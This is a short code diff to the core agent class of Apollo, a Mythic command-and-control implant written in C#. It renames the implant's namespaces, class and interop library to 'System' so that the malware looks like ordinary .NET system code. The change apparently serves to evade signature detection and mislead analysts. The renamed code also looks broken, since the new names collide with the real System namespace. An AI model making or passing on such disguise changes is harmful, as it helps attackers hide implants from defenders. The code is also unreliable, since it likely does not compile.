@@ -1,8 +1,8 @@
 ﻿using System;
 using System.Linq;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
-using AM = Apollo.Management;
+using SystemInterop.Interfaces;
+using SystemInterop.Structs.MythicStructs;
+using AM = System.Management;
 using System.Net;
 using System.Net.Sockets;
 using Microsoft.Win32;
@@ -10,12 +10,12 @@ using System.Net.NetworkInformation;
 using System.Collections.Generic;
 using System.IO;
 
-namespace Apollo.Agent
+namespace System.Agent
 {
-    public class Apollo : ApolloInterop.Classes.Agent
+    public class System : SystemInterop.Classes.Agent
     {
 
-        public Apollo(string uuid) : base(uuid)
+        public System(string uuid) : base(uuid)
         {
             Api = new Api.Api();
             C2ProfileManager = new AM.C2.C2ProfileManager(this);
